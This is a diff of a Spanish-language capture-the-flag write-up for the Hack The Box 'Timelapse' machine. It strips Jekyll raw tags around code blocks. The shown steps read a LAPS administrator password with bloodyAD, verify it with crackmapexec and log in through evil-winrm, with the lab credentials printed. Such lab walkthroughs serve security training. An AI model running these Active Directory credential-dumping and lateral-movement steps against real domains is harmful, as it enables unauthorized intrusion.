@@ -383,7 +383,6 @@ Vemos que el usuario `svc_deploy` es parte del grupo `LAPS_READERS` y que a su v
 
 Para eso podemos hacer uso de `bloodyAD` para poder ver la contraseña guardada del admin del `dc01`. 
 
-{% raw %}
 ```bash
 bloodyAD --host 10.10.11.152 -d timelapse.htb -u svc_deploy -p 'E3R$Q62^12p7PLlC%KWaxuaV' get search --filter '(ms-mcs-admpwdexpirationtime=*)' --attr ms-mcs-admpwd,ms-mcs-admpwdexpirationtime
 
@@ -391,25 +390,20 @@ distinguishedName: CN=DC01,OU=Domain Controllers,DC=timelapse,DC=htb
 ms-Mcs-AdmPwd: ){%%7x2H;3{%z#6mqs4BtFrL
 ms-Mcs-AdmPwdExpirationTime: 134044866155170475
 ```
-{% endraw %}
 
 Con eso podemos verificar si esa pass pertenece al usuario `Administrator`, para eso voy a usar `crackmapexec`.
 
-{% raw %}
 ```bash
 crackmapexec smb 10.10.11.152 -u administrator -p '){%%7x2H;3{%z#6mqs4BtFrL'
 SMB         10.10.11.152    445    DC01             [*] Windows 10 / Server 2019 Build 17763 x64 (name:DC01) (domain:timelapse.htb) (signing:True) (SMBv1:False)
 SMB         10.10.11.152    445    DC01             [+] timelapse.htb\administrator:){%%7x2H;3{%z#6mqs4BtFrL (Pwn3d!)
 ```
-{% endraw %}
 
 Ahora que tenemos la contraseña de `Administrator` podemos conectarnos como el en el dominio.
 
-{% raw %}
 ```bash
 evil-winrm -i 10.10.11.152 -u administrator -p '){%%7x2H;3{%z#6mqs4BtFrL'
 ```
-{% endraw %}
 
 Y la flag de `root` vamos a ver que esta en el directorio del user `TRX` que tambien es parte del grupo `Domain Admins`.
 
